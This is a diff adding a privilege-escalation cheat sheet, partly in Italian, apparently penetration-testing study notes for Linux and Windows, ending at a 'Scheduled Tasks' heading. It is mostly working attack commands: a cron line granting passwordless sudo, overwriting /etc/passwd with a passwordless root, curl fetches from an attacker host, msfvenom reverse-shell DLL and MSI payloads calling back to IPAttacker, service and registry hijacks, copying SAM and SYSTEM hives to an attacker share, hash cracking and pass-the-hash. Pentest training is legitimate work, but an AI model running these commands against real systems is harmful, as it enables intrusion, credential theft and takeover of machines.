@@ -1,0 +1,242 @@
+GENERALE
+
+ELEVARE PRIVILEGI POWERSHELL
+
+powershell "start-process powershell -verb runas"
+
+
+WINPEAS
+Add colors: reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+
+> winpeas.exe quite servicesinfo (Check service misconfiguration)
+> winpeas.exe quiet applicationsinfo quiet applicationsinfo (Check Registry)
+> winpeas.exe quiet filesinfo userinfo (Check password)
+> winpeas.exe quiet cmd windowscreds (Check credentials)
+======================================================================================================================
+Privilege Escalation in LINUX
+
+linuxprivchecker.py 
+
+BASIC:
+
+    KERNEL:
+    > uname -a
+    > cat /proc/version 2>/dev/null
+
+    OS version:
+    > hostnamectl 2>/dev/null
+    > lsb_release -a 2>/dev/null
+    > cat /etc/os-release 2>/dev/null
+    
+    Useful SW installed:
+    > which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
+   
+
+
+CRON:
+    > crontab -l
+    > ls -al /etc/cron* /etc/at*
+    > cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+    > echo 'echo "useradm ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
+
+SUID:
+    > find / -perm -u=s -type f 2>/dev/null (GTOBins)
+    > find / -writable -type d 2>/dev/null
+    Example cp:
+    - openssl passwd -1 -salt pwn pass123
+    - Copy etc/passwd in a local file in the attacker machine
+    - curl http://IPAttacker:8000/passwd--output /tmp/passwd
+    - cp passwd /etc/passwd
+    - ssh pwn@10.11.1.35 (password pass123)
+
+Weak File Permissions:
+    > ls -la /etc/passwd
+    > echo root::0:0:root:/root:/bin/bash > /etc/passwd (root senza password)
+    > su
+
+Env info:
+    > (env || set) 2>/dev/null
+
+Drives (check mounted and unmounted)
+   > grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
+   > ls /dev 2>/dev/null | grep -i "sd"
+   > cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
+
+Vulnerable SW installed:
+    > dpkg -l #Debian
+    > rpm -qa #Centos
+
+Processes:
+    > ps aux
+    > ps -ef
+    > top -n 1
+
+Linux Capabilities:
+
+    > /usr/sbin/getcap -r / 2>/dev/null
+======================================================================================================================
+Privilege Escalation in WINDOWS
+
+- potato.exe
+
+Basic Commands
+
+> whoami e whoami /groups
+> net localgroup <Gruppo>
+> powershell.exe -c "Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike '*system32*')}"
+
+Verificare App Installate
+
+> reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s | find "DisplayName"
+> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s 
+
+
+Cercare stringhe particolari in particolari estensioni dentro cmd
+
+> for /r "C:\Users" %f in (*.txt *.ini) do @(find /i "alex" "%f" >nul && echo %f contiene la stringa "alex")
+> dir C:\*.txt C:\*.ini /s /b > file.txt 2>nul
+
+
+Cercare una stringa particolare dentro un file in cmd
+> findstr /S /I /N "error" "C:\Logs\*.log"
+
+PS> Select-String -Path "C:\path\to\your\file.txt" -Pattern "yourSearchWord"
+
+Verifica di file sensibili
+
+PS> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+
+Ottenere path particolare processo
+
+PS> $process = Get-Process -Id 79
+PS> $executablePath = $process.Path
+PS> Write-Host "Il percorso del binario del processo è: $executablePath"
+
+Storia dei comandi
+
+PS> (Get-PSReadlineOption).HistorySavePath
+PS> Get-History
+
+
+> reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 (Run color Winpeas)
+> sc qc <name_service> (service current configuration)
+> sc query <name_service> (service current status)
+> sc config <name_service> (service modify options)
+> net start/stop <name_service>
+> accesschk.exe /accepteula -uwcqv <user> <name_service> (check which service an user can modify)
+> accesschk.exe /accepteula -uwcqv <user> * (check all services an user can modify)
+> accesschk.exe -ucqv <name_service> /accepteula
+
+[***USER INFO***]
+
+A) SeImpersonatePrivilege
+> whoami /priv
+or
+> winpeas.exe quiet userinfo
+
+
+[***SERVICE MISCONFIGURATION***]
+
+A) Insecure Service Permissions (winpeas: YOU CAN MODIFY THIS SERVICE)
+
+> winpeas.exe quiet servicesinfo > scanwin.txt
+> accesschk.exe /accepteula -uwcqv claudio <name_service>
+> sc qc <name_service> (Binary path name and Service start name=LocalSystem)
+> sc query <name_service> (state=STOPPED)
+> sc config <name_service> binpath="\"C:\reverse.exe\""
+> nc -lvnp 53
+> net start <name_service>
+
+B) Unquoted Service Path (winpeas: unquoted)
+
+> winpeas.exe quiet servicesinfo > scanwin.txt
+> accesschk /accepteula -ucqv claudio <name_service>
+> accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" (search BUILTIN\Users)
+> copy "reverse shell path" "C:\Program Files\Unquoted Path Service\Common.exe"
+> nc -lvnp 53
+> net start <name_service>
+
+C) Weak Registry Permissions (winpeas: the key Looking if you can modify any service registry)
+
+> winpeas.exe quiet servicesinfo > scanwin.txt
+> accesschk.exe /accepteula -uvwqk HKLM:\System\CurrentControlSet\Services\<name_service> (RW NT AUTHORITY\INTERACTIVE full control.This group take all suer log into the windows)
+> accesschk /accepteula -ucqv claudio <name_service>
+> reg query HKLM\SYSTEM\CurrentControlSet\services\<name_service>
+> reg add HKLM\SYSTEM\CurrentControlSet\services\<name_service> /v ImagePath /t REG_EXPAND_SZ /d C:\privEsc\reverse.exe /f
+> nc -lvnp 53
+> net start <name_service>
+
+D) Insecure Service Executables (winpeas: File Permissions: Everyone [All Access])
+
+> winpeas.exe quiet servicesinfo > scanwin.txt
+>.\accesschk.exe /accepteula -quvw "path_service" (RM Everyone FILE_ALL_ACCESS)
+> accesschk /accepteula -ucqv  <name_service>
+> copy "path_service" C:\Temp
+> copy /Y path_reverse "path_service"
+> nc -lvnp 53
+> net start <name_service>
+
+E) DLL Hijacking (winpeas: DLL Hijacking, DLL Hijack Service)
+
+> winpeas.exe quiet servicesinfo > scanwin.txt
+> accesschk.exe /accepteula -uvqc claudio <name_service>
+> sc qc <name_service> (Binary path name and Service start name=LocalSystem)
+> process monitor per monitorare <name_service> (see tiberius parte 7 )
+> net start <name_service> 
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPAttacker LPORT=53 -f dll -o /tools/hijackme.dll
+> nc -lvnp 53
+> copy \\IPAttacker\tools\hijackme.dll C:\Temp (in the process monitor it is find the dll in C:\Temp)
+> net stop <name_service>
+> net start <name_service>
+
+[***Registry***]
+
+A) Autoruns (winpeas: Autorun Applications)
+> winpeas.exe quiet applicationsinfo > scanwin.txt
+> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+> .\accesschk.exe /accepteula -wvu "path_file"
+> copy "path_file" C:\Temp
+> copy /Y C:\PrivEsc\reverse.exe "path_file"
+> nc -lvnp 53
+> restart the system
+
+B) AlwaysInstallElevated (winpeas: AlwaysInstallElevated set to 1)
+> winpeas.exe quiet windowscreds > scanwin.txt
+> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPAttacker LPORT=53 -f msi -o reverse.msi
+> nc -lvnp 53
+> copy \\IPAttacker\tools\reverse.msi
+> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi 
+
+[***Password***]
+
+A) Registry
+> reg query HKLM /f password /t REG_SZ /s
+> reg query HKCU /f password /t REG_SZ /s
+> winpeas.exe quiet filesinfo userinfo > scanwin.txt
+> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+> winexe -U 'admin%password123' --system //IPVittima cmd.exe (Dalla Kali usanod le credenziali di logon trovate con winpeas) 
+
+B) Saved Creds
+> winpeas quiet cmd windowscreds > scanwin.txt
+> cmdkey /list
+> nc -lvnp 53
+> runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+C) Configuration Files
+> dir /s *pass* == *.config
+> findstr /si password *.xml *.ini *.txt
+or
+> winpeas quiet cmd searchfast filesinfo > scanwin.txt
+
+D) SAM (Security Account Manager) and SYSTEM
+> winpeas quiet cmd searchfast filesinfo > scanwin.txt
+> copy C:\Windows\Repair\SAM \\IPAttacker\tools\
+> copy C:\Windows\Repair\SYSTEM \\IPAttacker\tools\
+> python2 pwdump.py /tools/SYSTEM /tools/SAM (da creddump7)
+> hashcat -m 1000 --force hash(secondo) rockyou.txt (crack the hash)
+o
+> pth-winexe --system -U 'admin%hashcompleto(primo e secondo) //IPVittima cmd.exe (pass the hash)
+
+[***Scheduled Tasks***]
